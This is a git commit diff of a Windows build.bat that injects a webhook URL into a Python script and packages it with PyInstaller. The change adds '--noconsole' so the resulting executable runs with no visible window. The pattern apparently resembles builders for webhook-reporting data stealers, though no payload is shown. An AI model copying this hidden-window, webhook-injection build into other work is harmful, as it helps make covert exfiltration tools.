cc5ce3d660f3150653562386e9816ba49259d131
Horizon89002 <arvinhizomi1999@gmail.com>
2024-10-07 17:40:57 +0400

    Update build.bat

--- build.bat
+++ build.bat
@@ -8,7 +8,7 @@ copy "SRC\script.py" "SRC\script_backup.py" >nul
 powershell -Command "(Get-Content 'SRC\script.py') -replace '{{WEBHOOK}}', '%webhook%' | Set-Content 'SRC\script.py'"
 
 echo Building the executable...
-pyinstaller --onefile --distpath dist --workpath build --specpath build SRC\script.py
+pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC\script.py
 
 copy "SRC\script_backup.py" "SRC\script.py" >nul
 
